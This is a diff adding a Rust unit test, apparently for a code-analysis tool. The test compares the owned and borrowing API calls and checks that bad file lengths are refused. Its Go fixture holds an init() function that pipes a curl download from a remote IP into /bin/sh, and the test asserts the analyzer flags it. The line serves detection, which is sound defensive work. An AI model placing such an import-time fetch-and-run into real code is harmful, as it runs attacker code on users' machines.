@@ -341,3 +341,26 @@ fn credentials_sent_when_used() {
     assert!(a.start.is_empty(), "{:?}", a.start);
     assert!(!uses(&a).is_empty(), "{:?}", a);
 }
+
+#[test]
+fn the_call_takes_its_text_as_it_is() {
+    // (api::call_owned: a module's files are read from the request's text, not from a copy of each; the answer is the
+    // borrowing call's, and a request whose lengths do not add up is refused the same way)
+    use crate::json::Value;
+    let files = [("m.go", "package m\n\nimport \"os/exec\"\n\nfunc init() {\n\texec.Command(\"/bin/sh\", \"-c\", \"curl -s https://203.0.113.7/a | sh\").Run()\n}\n"),
+                 ("x.go", "package m\n\nfunc F() int { return 1 }\n")];
+    let text: Vec<u32> = files.iter().flat_map(|(_, t)| u32s(t)).collect();
+    let list = Value::Arr(files.iter().map(|(p, t)| Value::Arr(vec![Value::Str(u32s(p)), Value::Int(t.chars().count() as i64)])).collect());
+    let args = Value::obj(vec![("files", list), ("module", Value::Str(u32s("example.test/m")))]);
+    let owned = crate::api::call_owned("go_package", &args, text.clone()).expect("an answer");
+    let borrowed = crate::api::call("go_package", &args, &text).expect("an answer");
+    assert_eq!(crate::json::write(&owned), crate::json::write(&borrowed));
+    assert!(crate::json::write(&owned).contains("runs a downloaded script through a shell"));
+    let short = text[..text.len() - 1].to_vec();
+    for (name, t) in [("go_package", short.clone()), ("rs_crate", short)] {
+        match crate::api::call_owned(name, &args, t) {
+            Err(crate::api::CallError::BadArgs(m)) => assert!(m.ends_with("the files' lengths run past the text"), "{}", m),
+            other => panic!("{:?}", other.is_ok()),
+        }
+    }
+}
